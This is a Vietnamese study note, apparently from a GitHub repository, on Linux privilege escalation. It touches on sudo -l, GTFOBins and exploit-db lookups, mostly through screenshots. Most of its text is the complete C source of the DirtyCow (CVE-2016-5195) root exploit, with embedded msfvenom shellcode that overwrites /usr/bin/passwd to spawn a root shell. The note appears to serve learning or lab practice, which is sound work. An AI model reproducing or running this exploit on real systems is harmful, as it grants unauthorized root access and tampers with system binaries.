### Leo thang đặc quyền trong GNU/Linux là quá trình giành được đặc quyền cao hơn trong hệ thống Linux, thường được chuyển từ người dùng có đặc quyền thấp sang tài khoản root . Điều này đạt được bằng cách khai thác các lỗ hổng , cấu hình sai hoặc các hành vi không an toàn cho phép truy cập hoặc kiểm soát trái phép.

<img width="898" height="895" alt="image" src="https://github.com/user-attachments/assets/d522810b-a455-47a7-8cb0-ca92021d54b9" />

<img width="911" height="910" alt="image" src="https://github.com/user-attachments/assets/0fd381e5-290f-4b0d-a503-31ead65376ad" />

<img width="877" height="633" alt="image" src="https://github.com/user-attachments/assets/7d9d6ff5-5ed9-4fbf-8952-9fd80ee5aeda" />

### câu hỏi của bạn hỏi về việc đọc (sudo -l) xem người dùng được phép chạy lệnh nào dưới quyền root, rồi lợi dụng những lệnh đó để leo thang đặc quyền (từ user thường lên root). GTFOBins là một kho công khai liệt kê những chương trình trên hệ thống mà, nếu được chạy dưới quyền root (hoặc với quyền nâng cao), có thể bị “lợi dụng” để mở shell, đọc/ghi file, tải lên, v.v.

<img width="614" height="865" alt="image" src="https://github.com/user-attachments/assets/0d012f4c-2d34-4545-a49a-70b599843336" />

<img width="630" height="794" alt="image" src="https://github.com/user-attachments/assets/cc32273d-f7c2-4664-8939-a1dd288c79a0" />

<img width="594" height="423" alt="image" src="https://github.com/user-attachments/assets/6b6d2a9b-17eb-4e37-b129-6a52aaff1149" />

<img width="882" height="410" alt="image" src="https://github.com/user-attachments/assets/7e908f87-7062-4352-ac12-c485ef74078f" />

<img width="883" height="627" alt="image" src="https://github.com/user-attachments/assets/dea4825a-a498-4513-8b07-d78e03c5f2c1" />

<img width="898" height="700" alt="image" src="https://github.com/user-attachments/assets/c74146b0-92c1-407f-b8aa-ca216771ceb3" />

### có nghĩa là mình sẽ dùng cái file A (có tên exploit ở cột Exploit Title) và exploit có địa chỉ là ô (Path) đúng k

<img width="859" height="351" alt="image" src="https://github.com/user-attachments/assets/8e91b24b-ffd4-4296-a973-a0619e350d41" />

<img width="619" height="918" alt="image" src="https://github.com/user-attachments/assets/ff960097-5d6c-4189-9356-82e1351e319b" />

```
/*
* A PTRACE_POKEDATA variant of CVE-2016-5195
* should work on RHEL 5 & 6
* 
* (un)comment correct payload (x86 or x64)!
* $ gcc -pthread c0w.c  -o c0w
* $ ./c0w
* DirtyCow root privilege escalation
* Backing up /usr/bin/passwd.. to /tmp/bak
* mmap fa65a000
* madvise 0
* ptrace 0
* $ /usr/bin/passwd 
* [root@server foo]# whoami 
* root
* [root@server foo]# id
* uid=0(root) gid=501(foo) groups=501(foo)
* @KrE80r
*/
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

// change if no permissions to read
char suid_binary[] = "/usr/bin/passwd";

/*
* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
*/ 
unsigned char shell_code[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;

/*
* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
unsigned char shell_code[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int sc_len = 136;
*/

void *madviseThread(void *arg) {
  int i,c=0;
  for(i=0;i<200000000;i++)
    c+=madvise(map,100,MADV_DONTNEED);
  printf("madvise %d\n\n",c);
}


int main(int argc,char *argv[]){

  printf("                                \n\
   (___)                                   \n\
   (o o)_____/                             \n\
    @@ `     \\                            \n\
     \\ ____, /%s                          \n\
     //    //                              \n\
    ^^    ^^                               \n\
", suid_binary);
  char *backup;
  printf("DirtyCow root privilege escalation\n");
  printf("Backing up %s to /tmp/bak\n", suid_binary);
  asprintf(&backup, "cp %s /tmp/bak", suid_binary);
  system(backup);

  f=open(suid_binary,O_RDONLY);
  fstat(f,&st);
  map=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
  pid=fork();
  if(pid){
    waitpid(pid,NULL,0);
    int u,i,o,c=0,l=sc_len;
    for(i=0;i<10000/l;i++)
      for(o=0;o<l;o++)
        for(u=0;u<10000;u++)
          c+=ptrace(PTRACE_POKETEXT,pid,map+o,*((long*)(shell_code+o)));
    printf("ptrace %d\n\n",c);
   }
  else{
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(),SIGSTOP);
    pthread_join(pth,NULL);
    }
  return 0;
}
```

<img width="588" height="594" alt="image" src="https://github.com/user-attachments/assets/9a7822a0-7c6e-4ced-aeae-aa55afade44f" />

<img width="631" height="891" alt="image" src="https://github.com/user-attachments/assets/07646171-0d56-4a8e-a5b2-5d76aa8653b3" />

<img width="585" height="718" alt="image" src="https://github.com/user-attachments/assets/be8fa0c6-b4a8-430d-885f-78b0e957f9dd" />

